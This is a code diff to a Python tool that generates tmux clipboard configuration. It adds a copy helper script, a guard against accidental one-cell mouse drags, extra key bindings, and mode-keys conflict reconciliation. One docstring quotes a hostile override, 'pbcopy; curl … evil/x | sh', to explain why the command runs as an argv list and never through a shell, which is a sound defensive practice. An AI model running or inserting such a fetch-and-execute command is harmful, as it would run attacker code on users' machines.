@@ -204,6 +204,33 @@ DEFAULT_CLIPBOARD_ENABLED = True
 DEFAULT_CLIPBOARD_MODE_KEYS = "vi"
 VALID_CLIPBOARD_MODE_KEYS = {"vi", "emacs"}
 
+# ── click-to-focus jitter guard (2026-09-24, "clicking a pane to focus it copies text") ────
+# `MouseDragEnd1Pane` fires whenever copy-mode was entered via the mouse AND the button is then
+# released -- but tmux/the terminal report a "drag" (button-1-held motion) event class purely
+# because SOME motion report arrived between press and release, NOT because the release cell
+# actually differs from the press cell. A terminal (verified live: WezTerm) can and does emit a
+# same-cell motion report for sub-cell mouse-sensor/trackpad jitter during an ordinary click
+# used only to focus/activate a pane -- root's own `MouseDrag1Pane` then unconditionally enters
+# copy-mode on that spurious report, and the immediate release lands back on the SAME cell,
+# selecting exactly the one character under the pointer and copying it via `MouseDragEnd1Pane`.
+# That single character is very often real (non-whitespace) content, so the empty/whitespace
+# guard above does NOT catch it -- a genuinely different failure mode from an empty selection.
+# tmux exposes the selection's start/end cell directly (`selection_start_x/y`,
+# `selection_end_x/y` -- see `man tmux` FORMATS): identical start and end cell is the reliable,
+# tmux-native signal that NO real drag distance was covered, regardless of what event classes
+# fired internally. `MouseDragEnd1Pane` (both tables) is wrapped in `if-shell -F` on that
+# comparison: a same-cell "drag" is treated as a plain click (`send-keys -X cancel` -- exit
+# copy-mode with no copy, exactly as an ordinary focus click should behave) instead of piping a
+# one-character accidental selection into the clipboard command. A genuine drag (any cell
+# difference) proceeds to the SAME guarded `copy-pipe-and-cancel` as before. Deliberately NOT
+# applied to `DoubleClick1Pane`/`TripleClick1Pane`: those are explicit multi-click GESTURES
+# (tmux's own `-d 0.3` click-sequence debounce already disambiguates them from a single click)
+# and must still copy the word/line under the cursor with zero drag distance.
+_CLIPBOARD_ZERO_DRAG_COND = (
+    "#{&&:#{==:#{selection_start_x},#{selection_end_x}},"
+    "#{==:#{selection_start_y},#{selection_end_y}}}"
+)
+
 
 def _clipboard_command_is_safe(cmd: str) -> bool:
     """True iff ``cmd`` is safe to interpolate into a tmux double-quoted option value.
@@ -272,6 +299,7 @@ CC_RESTORE_NAME = "cc-restore.sh"
 CC_MAP_NAME = "cc-sessions.map"
 ATTACH_NAME = "tmux-attach.sh"
 RIG_CONF_NAME = "rig.tmux.conf"
+CLIPBOARD_COPY_NAME = "tmux-copy-clipboard.sh"
 # The boot entrypoint the launchd agent runs. DEFECT 1: the agent must NOT run a bare
 # `tmux start-server` (an EMPTY server — tmux loads ~/.tmux.conf only on the FIRST session, so
 # continuum-restore never fires). This script does `tmux new-session -d` (which loads the conf
@@ -399,7 +427,8 @@ class TmuxPlan:
     def managed_scripts(self) -> list[tuple[Path, str]]:
         """The (path, body) pairs apply writes and drift checks — ONE source so they can't
         diverge: cc-save + cc-restore always, the attach-or-create entry when anti-sprawl is on,
-        the boot script when boot is on (the launchd agent's entrypoint — DEFECT 1).
+        the boot script when boot is on (the launchd agent's entrypoint — DEFECT 1), and the
+        clipboard wrapper when clipboard integration has a resolved command.
         """
         scripts = [
             (self.cc_save_path, self.render_cc_save()),
@@ -411,7 +440,67 @@ class TmuxPlan:
             scripts.append((self.boot_script_path, self.render_boot_script()))
         if self.autosave_enabled:
             scripts.append((self.autosave_script_path, self.render_autosave_script()))
+        if self.clipboard_enabled and self.clipboard_command:
+            scripts.append((self.clipboard_copy_path, self.render_clipboard_copy()))
         return scripts
+
+    @property
+    def clipboard_copy_path(self) -> Path:
+        return self.generated_dir / CLIPBOARD_COPY_NAME
+
+    def render_clipboard_copy(self) -> str:
+        """Render the copy-pipe helper shared by keyboard and mouse bindings.
+
+        tmux invokes a copy-pipe command even when a click releases without a selection.  The
+        helper must therefore inspect the complete selection before invoking the platform command:
+        empty/whitespace-only input is a no-op, preserving the existing system clipboard and
+        suppressing the success notification.  A notification is emitted only after the command
+        exits successfully.
+
+        SECURITY: the resolved command is executed as an ARGV list (each token individually
+        ``shlex.quote``d and placed as its own word in the script), never re-parsed by a shell
+        (``sh -c "$CLIPBOARD_COMMAND"``). ``_clipboard_command_is_safe`` only blocks the characters
+        hazardous for TMUX's OWN double-quoted option-value interpolation (``"``, ``\\``, ``$``,
+        ``#(``) -- it does NOT block shell metacharacters like ``;``/``|``/``&&``/backticks, so an
+        explicit ``tmux.clipboard.command`` override such as
+        ``"pbcopy; curl -s https://evil/x | sh"`` would, under a shell reparse, run the attacker's
+        pipeline on every copy. Splitting into argv (``shlex.split``) and exec'ing directly means
+        those characters are just literal bytes inside whichever token they fall in -- there is no
+        shell left to interpret them (the payload above becomes argv ``["pbcopy;", "curl", ...]``,
+        and ``pbcopy;`` is not a real binary, so it simply fails closed). A command that fails to
+        tokenize (unbalanced quoting) falls back to a single verbatim argv element -- it will not
+        resolve to a real binary either, but generation must never raise on a malformed override.
+        """
+        try:
+            argv = shlex.split(self.clipboard_command)
+        except ValueError:
+            argv = [self.clipboard_command]
+        command = " ".join(shlex.quote(tok) for tok in argv)
+        return f"""#!/usr/bin/env sh
+# rig-managed: tmux-copy-clipboard — GENERATED by rig from rig.yaml. Do not hand-edit.
+set -eu
+
+tmp=$(mktemp "${{TMPDIR:-/tmp}}/rig-tmux-copy.XXXXXX") || exit 1
+trap 'rm -f "$tmp"' EXIT HUP INT TERM
+cat > "$tmp"
+
+# A mouse release without a selection still reaches this helper.  Never clear the existing
+# clipboard or claim success for an empty/whitespace-only selection.
+if ! grep -q '[^[:space:]]' "$tmp"; then
+  exit 0
+fi
+
+# Executed as an argv list (see docstring), never `sh -c` -- no shell re-parses this line.
+if ! {command} < "$tmp"; then
+  exit 1
+fi
+
+if [ -n "${{TMUX_PANE:-}}" ]; then
+  tmux display-message -t "$TMUX_PANE" -d 2000 "Copied" >/dev/null 2>&1 || :
+else
+  tmux display-message -d 2000 "Copied" >/dev/null 2>&1 || :
+fi
+"""
 
     # ── independent autosave agent (#138) resolved paths ──────────────────────────────
     @property
@@ -628,17 +717,19 @@ class TmuxPlan:
         if self.clipboard_enabled and self.clipboard_command:
             # Placed BEFORE continuum's run-shell init, same as pane-titles/Moshi above — no
             # ordering dependency on continuum here, just consistent section placement.
-            cmd = self.clipboard_command
+            helper = shlex.quote(str(self.clipboard_copy_path))
             out += [
                 "",
                 "# ── copy-mode clipboard (rig apply tmux.clipboard) ──────────────────────────",
-                "# tmux's own copy-mode-vi Enter/MouseDragEnd1Pane already run copy-pipe-and-cancel",
-                "# with NO pipe command — that only fills tmux's OWN paste buffer, never the system",
-                "# clipboard (Terminal.app has no OSC-52 clipboard support at all). Piping through",
-                f"# the resolved '{cmd}' fixes both the keyboard (prefix [, v, Enter) and the",
-                "# mouse-drag-release flow. NOTE: `set -g mouse on` is a personal ~/.tmux.conf",
-                "# preference (not rig-managed) — it must ALSO be set for tmux to report a",
-                "# mouse-drag-release event at all; rig does not force it.",
+                "# A shared helper receives the complete selection before it invokes the platform",
+                "# clipboard command. Empty/whitespace-only selections are ignored, preserving the",
+                "# existing clipboard and suppressing the success notification.",
+                "# `mode-keys` and binding layout are controlled by tmux.clipboard.mode_keys.",
+                "# EVERY tmux entry point that can produce a copy -- both key tables' documented",
+                "# select/yank/kill keys, mouse-drag release, double/triple-click, and the",
+                "# root-table click-to-copy passthrough (reachable without `prefix [` first) -- is",
+                "# bound through this SAME helper, never straight to the resolved clipboard",
+                "# command, so none of them can bypass the empty/whitespace guard.",
             ]
             if self.clipboard_mode_keys == "vi":
                 out += [
@@ -649,30 +740,83 @@ class TmuxPlan:
                     "# mode_keys: emacs opts out and skips this line, trading away v/y for that).",
                     "set -g mode-keys vi",
                 ]
+            else:
+                out += [
+                    "# tmux.clipboard.mode_keys: emacs — explicitly (re)assert emacs as the LIVE",
+                    "# table on every apply. Without this, a config change from vi back to emacs",
+                    "# would leave a STALE `mode-keys vi` from a PREVIOUS apply live (nothing else",
+                    "# ever overwrites it), so reconcile would silently drift out of sync with the",
+                    "# declared config. v/y are mirrored into the plain `copy-mode` table below.",
+                    "set -g mode-keys emacs",
+                ]
             out += [
-                "bind-key -T copy-mode-vi v send-keys -X begin-selection",
-                f'bind-key -T copy-mode-vi y send-keys -X copy-pipe-and-cancel "{cmd}"',
-                f'bind-key -T copy-mode-vi Enter send-keys -X copy-pipe-and-cancel "{cmd}"',
-                f'bind-key -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel "{cmd}"',
-                # Mirrored into the plain `copy-mode` (emacs) table: whatever `mode-keys` ends up
-                # being (see above), `Enter`/`MouseDragEnd1Pane` still fire the resolved clipboard
-                # command in the OTHER table too — the mouse-drag-release flow (and a bare
-                # `prefix [ ... Enter` with no vi-style selection) works either way, and a user who
-                # opts back into `mode_keys: emacs` still gets these two rather than nothing.
-                f'bind-key -T copy-mode Enter send-keys -X copy-pipe-and-cancel "{cmd}"',
-                f'bind-key -T copy-mode MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel "{cmd}"',
+                'bind-key -T copy-mode-vi v send-keys -X begin-selection',
+                f'bind-key -T copy-mode-vi y send-keys -X copy-pipe-and-cancel "{helper}"',
+                f'bind-key -T copy-mode-vi Enter send-keys -X copy-pipe-and-cancel "{helper}"',
+                f'bind-key -T copy-mode-vi C-j send-keys -X copy-pipe-and-cancel "{helper}"',
+                f'bind-key -T copy-mode-vi D send-keys -X copy-pipe-end-of-line-and-cancel "{helper}"',
+                (
+                    "bind-key -T copy-mode-vi MouseDragEnd1Pane if-shell -F "
+                    f'"{_CLIPBOARD_ZERO_DRAG_COND}" '
+                    '"send-keys -X cancel" '
+                    f'"send-keys -X copy-pipe-and-cancel \\"{helper}\\""'
+                ),
+                (
+                    "bind-key -T copy-mode-vi DoubleClick1Pane select-pane \\; "
+                    "send-keys -X select-word \\; run-shell -d 0.3 \\; "
+                    f'send-keys -X copy-pipe-and-cancel "{helper}"'
+                ),
+                (
+                    "bind-key -T copy-mode-vi TripleClick1Pane select-pane \\; "
+                    "send-keys -X select-line \\; run-shell -d 0.3 \\; "
+                    f'send-keys -X copy-pipe-and-cancel "{helper}"'
+                ),
+                # Mirrored into the plain `copy-mode` (emacs) table so mouse release/click and
+                # Enter work regardless of the selected mode-keys table.
+                f'bind-key -T copy-mode Enter send-keys -X copy-pipe-and-cancel "{helper}"',
+                (
+                    "bind-key -T copy-mode MouseDragEnd1Pane if-shell -F "
+                    f'"{_CLIPBOARD_ZERO_DRAG_COND}" '
+                    '"send-keys -X cancel" '
+                    f'"send-keys -X copy-pipe-and-cancel \\"{helper}\\""'
+                ),
+                (
+                    "bind-key -T copy-mode DoubleClick1Pane select-pane \\; "
+                    "send-keys -X select-word \\; run-shell -d 0.3 \\; "
+                    f'send-keys -X copy-pipe-and-cancel "{helper}"'
+                ),
+                (
+                    "bind-key -T copy-mode TripleClick1Pane select-pane \\; "
+                    "send-keys -X select-line \\; run-shell -d 0.3 \\; "
+                    f'send-keys -X copy-pipe-and-cancel "{helper}"'
+                ),
+                # Root table: click-to-copy WITHOUT requiring `prefix [` first. tmux's own
+                # default chain (verified against a stock 3.5a `list-keys -T root`) is
+                # `copy-mode -H ; select-word/select-line ; copy-pipe-and-cancel` with NO
+                # command -- that only fills tmux's internal paste buffer. Same chain, with the
+                # guarded helper substituted in as the pipe command, so a plain double/triple
+                # click (the most common real-world copy gesture, and exactly how an accidental
+                # click on blank/whitespace text reaches the clipboard) is guarded too.
+                (
+                    "bind-key -T root DoubleClick1Pane select-pane -t = \\; "
+                    'if-shell -F "#{||:#{pane_in_mode},#{mouse_any_flag}}" { send-keys -M } '
+                    "{ copy-mode -H ; send-keys -X select-word ; run-shell -d 0.3 ; "
+                    f'send-keys -X copy-pipe-and-cancel "{helper}" }}'
+                ),
+                (
+                    "bind-key -T root TripleClick1Pane select-pane -t = \\; "
+                    'if-shell -F "#{||:#{pane_in_mode},#{mouse_any_flag}}" { send-keys -M } '
+                    "{ copy-mode -H ; send-keys -X select-line ; run-shell -d 0.3 ; "
+                    f'send-keys -X copy-pipe-and-cancel "{helper}" }}'
+                ),
             ]
             if self.clipboard_mode_keys == "emacs":
-                # Opt-out case: `mode-keys` stays `emacs`, so `copy-mode-vi` never activates and
-                # `v`/`y` above are unreachable dead bindings. tmux's own emacs-table defaults
-                # leave both `v` and `y` UNBOUND (verified live: `tmux list-keys -T copy-mode` on
-                # a stock 3.5a server has no `v`/`y` entry — nothing here clobbers a real default),
-                # so mirror the SAME two keys into the plain `copy-mode` table: a user who
-                # explicitly keeps emacs navigation still gets the full `prefix [`, `v`, `y`/`Enter`
-                # keyboard flow, just without vi's other motion keys.
                 out += [
                     "bind-key -T copy-mode v send-keys -X begin-selection",
-                    f'bind-key -T copy-mode y send-keys -X copy-pipe-and-cancel "{cmd}"',
+                    f'bind-key -T copy-mode y send-keys -X copy-pipe-and-cancel "{helper}"',
+                    f'bind-key -T copy-mode C-w send-keys -X copy-pipe-and-cancel "{helper}"',
+                    f'bind-key -T copy-mode M-w send-keys -X copy-pipe-and-cancel "{helper}"',
+                    f'bind-key -T copy-mode C-k send-keys -X copy-pipe-end-of-line-and-cancel "{helper}"',
                 ]
 
         out += [
@@ -1835,3 +1979,135 @@ def _comment(line: str) -> str:
         return line
     nl = "\n" if line.endswith("\n") else ""
     return NEUTRALIZE_PREFIX + line.rstrip("\n") + nl
+
+
+# ── clipboard mode-keys exact-key conflict reconciliation (warn-and-preserve) ──────────────
+# `mode-keys` is a GENERIC tmux option any user might set for reasons unrelated to rig's
+# clipboard feature — unlike the continuum/resurrect/plugin namespace (which rig owns
+# unconditionally), rig is only the AUTHORITY over `mode-keys` while `tmux.clipboard` actually
+# resolves a command (exactly when `render_rig_conf` itself emits its own `set -g mode-keys
+# <value>` — see the clipboard section above). An inline user line whose value EXACTLY conflicts
+# with the resolved `mode_keys` is commented out with a structured, reversible marker (never
+# silently dropped); a line inside a user `{ … }` conditional is genuinely ambiguous and is left
+# untouched with a warning instead. Once rig is no longer authoritative, any marker this pass
+# previously wrote is restored verbatim — the reconciliation must be fully reversible.
+CLIPBOARD_CONFLICT_SOURCE = "tmux.clipboard.mode_keys"
+_CLIPBOARD_MARKER_OPEN = "# rig-migrated (key=mode-keys, prior="
+_CLIPBOARD_MARKER_MID = ", rig="
+_CLIPBOARD_MARKER_CLOSE = f", source={CLIPBOARD_CONFLICT_SOURCE}): "
+
+
+def _clipboard_conflict_marker(line: str, prior: str, effective: str) -> str:
+    """Wrap ``line`` in the structured clipboard mode-keys conflict marker (mirrors :func:`_comment`'s
+    idempotent column-0 style — the original line's own leading whitespace, if any, is preserved
+    verbatim inside the wrapped tail, only the trailing newline is detached/reattached)."""
+    nl = "\n" if line.endswith("\n") else ""
+    prefix = f"{_CLIPBOARD_MARKER_OPEN}{prior}{_CLIPBOARD_MARKER_MID}{effective}{_CLIPBOARD_MARKER_CLOSE}"
+    return prefix + line.rstrip("\n") + nl
+
+
+def _restore_clipboard_conflict_marker(line: str) -> str | None:
+    """If ``line`` carries :func:`_clipboard_conflict_marker`'s marker, return the ORIGINAL line
+    it wraps (marker stripped); else ``None``."""
+    if not line.startswith(_CLIPBOARD_MARKER_OPEN):
+        return None
+    idx = line.find(_CLIPBOARD_MARKER_CLOSE)
+    if idx == -1:
+        return None
+    return line[idx + len(_CLIPBOARD_MARKER_CLOSE):]
+
+
+def _iter_scoped_lines_with_kind(conf_text: str):
+    """Like :func:`_iter_scoped_lines` but distinguishes WHY a line is protected: yields
+    ``(line, kind)`` with ``kind`` one of ``"live"`` (unprotected, reconcilable), ``"block"``
+    (inside rig's OWN managed block — never the user's, never warned about) or ``"conditional"``
+    (inside a user ``{ … }`` guard — genuinely ambiguous). Local to clipboard reconciliation only:
+    the continuum/resurrect/Moshi passes never need the distinction (they silently skip BOTH
+    kinds identically), but a user-guarded stray `mode-keys` is worth a warning while rig's own
+    generated block obviously is not. Same brace-depth/managed-block state machine as
+    :func:`_iter_scoped_lines` — kept as a separate small generator rather than widening that
+    shared one, so the already-tested continuum/resurrect/Moshi passes are untouched."""
+    in_block = False
+    depth = 0
+    for line in conf_text.splitlines(keepends=True):
+        s = line.strip()
+        if s == BLOCK_BEGIN:
+            in_block = True
+            yield line, "block"
+            continue
+        if s == BLOCK_END:
+            in_block = False
+            yield line, "block"
+            continue
+        if in_block:
+            yield line, "block"
+            continue
+        opening = s.endswith("{") and not s.startswith("#")
+        closing = s.startswith("}")
+        kind = "conditional" if (depth > 0 or opening) else "live"
+        yield line, kind
+        if opening:
+            depth += 1
+        elif closing and depth > 0:
+            depth -= 1
+
+
+def reconcile_clipboard_mode_keys(conf_text: str, plan: TmuxPlan) -> tuple[str, list[str]]:
+    """Reconcile an inline user ``mode-keys`` directive in ``conf_text`` against
+    ``plan.clipboard_mode_keys`` — the exact-key 'warn-and-preserve' conflict policy documented
+    at the call site / module comment above. Pure; returns ``(new_conf_text, warnings)``. Called
+    alongside :func:`neutralize_inline_rig_lines` on every apply/dry-run so both passes see the
+    same conf text and conclude identically — see ``riglib/actions/runner.py``'s
+    ``_do_provision_tmux``.
+
+    NOTE (accepted, not exercised by any required test): once a line is marked, it stays marked
+    verbatim across further applies AS LONG AS rig remains authoritative — even if a LATER config
+    change makes the marked line's prior value equal the new effective value again. Mirrors the
+    existing continuum/resurrect passes' same 'permanent once matched' posture; re-evaluating a
+    live marker on every pass is not required by the approved policy.
+    """
+    authoritative = plan.clipboard_enabled and bool(plan.clipboard_command)
+    effective = plan.clipboard_mode_keys
+    out: list[str] = []
+    warnings: list[str] = []
+    for line, kind in _iter_scoped_lines_with_kind(conf_text):
+        if kind != "live":
+            if kind == "conditional" and authoritative and _set_option_name(line.strip()) == "mode-keys":
+                warnings.append(
+                    "tmux.clipboard.mode_keys: an inline `mode-keys` directive inside a "
+                    "conditional (`{ … }`) block is ambiguous — left untouched; move it out of "
+                    "the conditional, or set tmux.clipboard.mode_keys to match it by hand"
+                )
+            out.append(line)
+            continue
+
+        restored = _restore_clipboard_conflict_marker(line)
+        if restored is not None:
+            # already marked by a PRIOR pass of this function: restore verbatim once rig is no
+            # longer the authority, else leave the marker exactly as-is (idempotent — never
+            # re-marked, never re-warned).
+            out.append(restored if not authoritative else line)
+            continue
+        if not authoritative:
+            out.append(line)
+            continue
+
+        opt = _set_option_name(line.strip())
+        if opt != "mode-keys":
+            out.append(line)
+            continue
+        value = _set_option_value(line.strip())
+        if value is None:
+            out.append(line)
+            continue
+        prior = value.strip("'\"")
+        if prior == effective:
+            out.append(line)
+            continue
+        out.append(_clipboard_conflict_marker(line, prior, effective))
+        warnings.append(
+            f"tmux.clipboard.mode_keys: ~/.tmux.conf sets `mode-keys {prior}` inline but rig "
+            f"resolves `{effective}` — commented the inline line (see the rig-migrated marker "
+            f"above it); disable tmux.clipboard or set mode_keys: {prior} to keep it live"
+        )
+    return "".join(out), warnings
